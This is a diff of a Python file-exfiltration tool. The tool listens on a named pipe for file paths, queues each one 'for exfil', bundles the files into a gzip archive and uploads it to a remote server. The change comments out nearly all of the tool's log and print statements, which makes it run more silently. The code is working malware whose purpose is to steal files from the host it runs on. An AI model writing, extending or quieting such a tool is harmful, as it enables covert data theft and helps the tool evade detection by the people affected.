@@ -109,10 +109,10 @@ file_buffer = FileStack(idle_timeout=10)
 def watch_and_bundle(mid):
     while True:
         time.sleep(5)
-        print("Checking for idle state...")
+#       print("Checking for idle state...")
         if file_buffer.is_idle() and file_buffer.stack:
             archive = file_buffer.bundle_files()
-            print(f"Bundled files to {archive}, sending to server...")
+#           print(f"Bundled files to {archive}, sending to server...")
             with open(archive, "rb") as f:
                 files = {
                     "upload": (archive, f, "application/gzip"),
@@ -126,21 +126,21 @@ def watch_and_bundle(mid):
 
 
 def fifo_listener(pipe_path, file_buffer):
-    print(f"[+] Starting FIFO listener on {pipe_path}")
+#   print(f"[+] Starting FIFO listener on {pipe_path}")
     if not os.path.exists(pipe_path):
         os.mkfifo(pipe_path)
         print(f"[+] FIFO created at {pipe_path}")
 
-    print(f"[+] Listening to FIFO at {pipe_path}")
+#   print(f"[+] Listening to FIFO at {pipe_path}")
     while True:
         with open(pipe_path, "r") as pipe:
             for line in pipe:
                 filepath = line.strip()
                 if os.path.isfile(filepath):
-                    print(f"[+] Marked for exfil: {filepath}")
+#                   print(f"[+] Marked for exfil: {filepath}")
                     file_buffer.add_file(filepath)
-                else:
-                    print(f"[-] Not a file or doesn't exist: {filepath}")
+#                else:
+#                   print(f"[-] Not a file or doesn't exist: {filepath}")
 
 
 def main():
